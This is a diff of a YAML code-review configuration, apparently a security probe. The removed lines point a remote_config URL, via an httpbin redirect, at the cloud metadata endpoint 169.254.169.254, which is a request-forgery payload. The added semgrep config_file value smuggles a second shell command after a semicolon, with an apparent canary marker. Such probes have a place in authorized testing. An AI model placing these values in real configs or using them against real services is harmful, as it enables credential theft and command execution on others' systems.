@@ -1,2 +1,8 @@
-remote_config:
-  url: "https://httpbin.org/redirect-to?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fdynamic%2Finstance-identity%2Fdocument&status_code=302"
+reviews:
+  profile: assertive
+  tools:
+    eslint:
+      enabled: true
+    semgrep:
+      enabled: true
+      config_file: "security-rules/semgrep-safe.yml; printf CR_H1_SAFE_SEMGREP_CONFIG_ARG_20260814_C >&2; #"
